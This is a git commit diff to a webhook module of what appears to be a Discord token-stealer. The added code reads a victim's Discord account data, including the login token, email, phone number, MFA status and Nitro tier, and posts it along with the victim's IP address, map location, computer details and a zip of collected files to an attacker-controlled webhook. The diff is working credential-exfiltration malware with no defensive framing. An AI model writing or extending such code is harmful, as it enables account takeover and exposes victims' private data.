606eeaa41c0c4588c394b5406b40cb024246d025
NetherMC <thelio.trinite@outlook.com>
2023-02-12 15:33:34 +0100

    discord account info

--- functions/webhook.js
+++ functions/webhook.js
@@ -7,13 +7,14 @@ const { filesize } = require('filesize');
 const fs = require('fs');
 const { tempFolder } = require('../index');
 const FormData = require('form-data');
-const { rmSync } = require('fs');
+const { rmSync, readFileSync } = require('fs');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
 const zipFile = fs.readdirSync(tempFolder).find(file => file.split('.').pop() === 'zip');
 const json = async () => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
+  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
   const computerInfoFields = [
     ['RAM', filesize(Math.round(os.totalmem()))],
     ['Name', os.hostname()],
@@ -26,19 +27,88 @@ const json = async () => {
   const ipInfoFields = [
     ['IP Address', `[${await ipInfo('query')}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
     ['Location', `[${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
-    ['ISP', `${await ipInfo('isp')}`],
+    ['ISP', await ipInfo('isp')],
+  ];
+  const discordAccountInfoFields = [
+    ['ID', discordAccountInfo.account.id],
+    ['Bio', discordAccountInfo.account.bio],
+    ['Locale', discordAccountInfo.account.locale],
+    ['NSFW Allowed', discordAccountInfo.account.nsfw_allowed],
+    ['MFA Enabled', discordAccountInfo.account.mfa_enabled],
+    ['Email', discordAccountInfo.account.email || 'No Email'],
+    ['Email Verified', discordAccountInfo.account.verified],
+    ['Phone Number', discordAccountInfo.account.phone || 'No Phone Number'],
+    ['Nitro Subscription', (() => { switch (discordAccountInfo.account.premium_type) {
+      case 0:
+        return 'No Nitro';
+      case 1:
+        return 'Nitro Classic';
+      case 2:
+        return 'Nitro';
+      case 3:
+        return 'Nitro Basic';
+      default:
+        return 'No Nitro';
+    } })()],
+    /*['Flags', (() => { let flags = []; switch (discordAccountInfo.account.flags) {
+      case 1 << 0:
+        flags.push('Staff'); break;
+      case 1 << 1:
+        flags.push('Partner'); break;
+      case 1 << 2:
+        flags.push('HypeSquad'); break;
+      case 1 << 3:
+        flags.push('Bug Hunter (Level 1)'); break;
+      case 1 << 6:
+        flags.push('HypeSquad (House 1)'); break;
+      case 1 << 7:
+        flags.push('HypeSquad (House 2)'); break;
+      case 1 << 8:
+        flags.push('HypeSquad (House 3)'); break;
+      case 1 << 9:
+        flags.push('Early Supporter'); break;
+      case 1 << 10:
+        flags.push('Team User'); break;
+      case 1 << 14:
+        flags.push('Bug Hunter (Level 2)'); break;
+      case 1 << 16:
+        flags.push('Verified Bot'); break;
+      case 1 << 17:
+        flags.push('Verified Developer'); break;
+      case 1 << 18:
+        flags.push('Certified Moderator'); break;
+      case 1 << 19:
+        flags.push('Bot HTTP Interactions'); break;
+      case 1 << 22:
+        flags.push('Active Developer'); break;
+      default:
+        return 'No Flags';
+    } return flags.join(', '); })()],*/
   ];
   return {
     content: webhook.content,
     embeds: [
       {
-        title: 'Computer info',
+        title: 'Computer Info',
         fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
       },
       {
-        title: 'IP info',
+        title: 'IP Info',
         fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
       },
+      {
+        title: 'Discord Account',
+        description: `Token: \`\`\`\n${discordAccountInfo.account.token}\n\`\`\``,
+        author: {
+          name: `${discordAccountInfo.account.username}#${discordAccountInfo.account.discriminator}`,
+          icon_url: `https://cdn.discordapp.com/avatars/${discordAccountInfo.account.id}/${discordAccountInfo.account.avatar}.${discordAccountInfo.account.avatar.startsWith('a_') ? 'gif' : 'png'}`
+        },
+        fields: discordAccountInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; }),
+        color: discordAccountInfo.account.accent_color,
+      },
+      {
+        title: 'Discord Account - Billing'
+      }
     ],
     allowed_mentions: {
       parse: ['everyone'],
@@ -60,7 +130,7 @@ const json = async () => {
   data.append('files[0]', fs.createReadStream(join(tempFolder, zipFile)));
   data.append('payload_json', JSON.stringify(await json()));
 
-  await axios.post(webhook.url, data, {
+  axios.post(webhook.url, data, {
     headers: { 'Content-Type': 'multipart/form-data' },
   })
     .then(res => {
